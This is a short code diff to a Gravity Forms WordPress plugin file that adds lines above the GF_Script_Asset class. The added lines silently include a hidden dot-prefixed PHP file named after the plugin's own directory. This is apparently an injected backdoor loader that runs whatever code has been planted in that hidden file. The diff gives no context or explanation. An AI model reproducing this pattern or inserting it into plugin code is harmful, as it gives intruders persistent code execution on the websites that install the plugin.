@@ -13,6 +13,10 @@ if ( ! class_exists( 'GFForms' ) ) {
 /**
  * Class GF_Script_Asset
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class GF_Script_Asset extends GF_Asset {
 
 	/**
